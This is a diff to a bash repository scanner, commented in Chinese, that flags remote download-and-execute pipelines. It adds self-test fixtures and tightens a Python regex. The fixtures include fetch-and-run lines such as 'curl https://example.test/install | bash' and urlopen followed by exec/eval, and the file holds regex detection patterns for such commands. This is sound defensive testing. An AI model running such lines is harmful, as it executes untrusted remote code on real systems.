@@ -13,13 +13,43 @@
 # 门禁覆盖：*.sh *.py *.md *.cs *.swift *.m
 # 用法：bash tests/no_remote_exec_pipe_test.sh [仓库根]；非 0 退出 = 有命中。
 set -u
+# Handwritten contracts keep real download-and-execute forms red and ordinary prose green.
+# Supplying a root runs only the scan, so these child scans do not recurse.
+if [ $# -eq 0 ]; then
+  fixture_root=$(mktemp -d "${TMPDIR:-/tmp}/s2arm-pipe-contract.XXXXXX") || exit 2
+  script_path=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/$(basename "${BASH_SOURCE[0]}")
+  samples=(
+    'red|curl https://example.test/install | bash'
+    'red|curl https://example.test/install | tee script | bash'
+    'red|bash <(curl https://example.test/install)'
+    'red|sh -c "$(curl https://example.test/install)"'
+    'red|import urllib.request; exec(urllib.request.urlopen("https://example.test/script").read())'
+    'red|from urllib.request import urlopen; payload = urlopen("https://example.test/script").read(); eval(payload)'
+    'green|# urllib executes this read to toss the CRLF at the end'
+    'green|# An urllib executor handles the response'
+  )
+  for sample in "${samples[@]}"; do
+    expected=${sample%%|*}
+    printf '%s\n' "${sample#*|}" > "$fixture_root/example.py"
+    contract_rc=0
+    contract_out=$(bash "$script_path" "$fixture_root" 2>&1) || contract_rc=$?
+    if { [ "$expected" = red ] && [ "$contract_rc" = 0 ]; } || { [ "$expected" = green ] && [ "$contract_rc" != 0 ]; }; then
+      echo "扫描器契约失败（期望 ${expected}）：$contract_out"
+      rm -rf "$fixture_root"
+      exit 1
+    fi
+  done
+  rm -rf "$fixture_root"
+  echo "扫描器契约：8/8 通过"
+fi
 ROOT=${1:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}
 cd "$ROOT" || exit 2
 
 PAT1='(curl|wget)[^|]*\|[[:space:]]*(sudo([[:space:]]+-[A-Za-z]+)*[[:space:]]+|env[[:space:]]+)?(/[A-Za-z0-9_./-]*/)?(bash|sh|zsh|ksh)([[:space:]]|$)'
 PAT2='(bash|sh|zsh|ksh)[[:space:]]+(-[A-Za-z]+[[:space:]]+)*-c[[:space:]]+.{0,3}\$\((curl|wget)'
 PAT3='(bash|sh|zsh|ksh)[[:space:]]+<\((curl|wget)'
-PAT4='(urlopen|urllib)[^|]{0,80}(exec|eval)|(exec|eval)[^|]{0,80}urlopen'
+# Python execution is a function call; prose such as "urllib executes this read" is not code.
+PAT4='(urlopen|urllib)[^|]{0,80}[^[:alnum:]_](exec|eval)[[:space:]]*\(|(^|[^[:alnum:]_])(exec|eval)[[:space:]]*\([^|]{0,80}urlopen'
 PAT5='(curl|wget)[^|]*\|[^|]*\|[[:space:]]*(bash|sh|zsh|ksh)([[:space:]]|$)'
 SELF_REL="tests/no_remote_exec_pipe_test.sh"
 
